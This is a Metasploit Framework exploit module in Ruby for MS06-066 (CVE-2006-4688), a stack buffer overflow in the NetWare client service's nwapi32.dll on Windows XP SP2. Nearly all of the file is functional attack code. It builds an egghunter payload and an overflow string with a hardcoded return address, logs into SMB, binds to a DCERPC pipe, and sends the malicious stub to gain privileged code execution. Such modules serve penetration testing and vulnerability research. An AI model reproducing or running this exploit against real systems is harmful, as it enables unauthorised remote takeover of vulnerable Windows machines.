##
# $Id: ms06_066_nwapi.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Services MS06-066 nwapi32.dll',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the svchost service, when the netware
				client service is running. This specific vulnerability is in the nwapi32.dll module.
			},
			'Author'         => [ 'pusscat' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2006-4688'],
					[ 'OSVDB', '30260'],
					[ 'BID', '21023'],
					[ 'MSB', 'MS06-066'],

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 296,
					'BadChars' => "",
					'Compat'   =>
					{
						# -ws2ord XXX?
					},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP2',
						{
							'Ret'      => 0x00EBEEEC ,
						},
					]
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Nov 14 2006'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'srvsvc']),
			], self.class)
	end

	def exploit
		# [in] [unique] wchar *
		# [in] wchar *
		# [in, out] long
		# [out] handle

		# Generate the egghunter payload
		hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		egg    = hunter[1]
		#print_status("Today, we'll be hunting for 0x#{egg.unpack("V")[0]}")

		# Add giant blocks of guard data before and after the egg
		eggdata  =
			rand_text(1024) +
				egg +
			rand_text(1024)

		buflen = 295
		ofstring	= Rex::Text.to_unicode('\\\\') + "\x90" + hunter[0] + rand_text(buflen-hunter[0].length) +
			[ target.ret ].pack('V') + "\x00"
		#ofstring	= Rex::Text.to_unicode('\\\\') + payload.encoded + [ target.ret ].pack('V') + "\x00\x00"

		stubdata =
			NDR.long(rand(0xffffffff)) +
				NDR.UnicodeConformantVaryingString("\\\\BBBB") +
			NDR.UnicodeConformantVaryingStringPreBuilt(ofstring) +  # HERE!
			#NDR.UnicodeConformantVaryingString('\\\\' + "A"*1024 + "\x00") +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			#NDR.long((ofstring.length * 2) + 0xC) +
			eggdata

		print_status("Connecting to the SMB service...")
		connect()
		smb_login()

		handle = dcerpc_handle('e67ab081-9844-3521-9d32-834f038001c0', '1.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		print_status("Calling the vulnerable function...")

		begin
			dcerpc.call(0x09, stubdata)
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			print_status('Server did not respond, this is expected')
		rescue => e
			if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
				print_status('Server disconnected, this is expected')
			else
				raise e
			end
		else
			print_status("Got #{dcerpc.last_response.stub_data.length} bytes: #{dcerpc.last_response.stub_data}")
		end

		# Cleanup
		handler
		disconnect

		if (dcerpc.last_response != nil and
			dcerpc.last_response.stub_data != nil and
			dcerpc.last_response.stub_data == "\x04\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00")
			return true
		else
			return false
		end
	end

end
